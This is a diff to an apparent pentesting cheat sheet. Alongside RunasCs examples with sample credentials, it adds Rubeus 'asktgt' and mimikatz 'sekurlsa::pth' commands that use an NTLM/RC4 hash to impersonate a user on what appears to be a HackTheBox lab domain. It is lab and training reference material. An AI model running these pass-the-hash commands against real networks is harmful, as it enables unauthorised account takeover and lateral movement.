@@ -20,3 +20,15 @@ Invoke-RunasCs <Username> <Password> "Command"
 Invoke-RunasCs Admin password "whoami"
 Invoke-RunasCs g.jarvis P@ssword123 "whoami"
 ```
+Other tools such as [Rubeus](https://github.com/GhostPack/Rubeus) and [mimikatz](https://github.com/gentilkiwi/mimikatz) can be passed cleartext credentials or an NTLM password hash.
+## CMD - Rubeus.exe Cleartext Credentials
+
+```cmd
+rubeus.exe asktgt /user:jackie.may /domain:htb.local /dc:10.10.110.100 /rc4:ad11e823e1638def97afa7cb08156a94
+```
+
+## CMD - Mimikatz.exe Cleartext Credentials
+
+```cmd
+mimikatz.exe sekurlsa::pth /domain:htb.local /user:jackie.may /rc4:ad11e823e1638def97afa7cb08156a94
+```
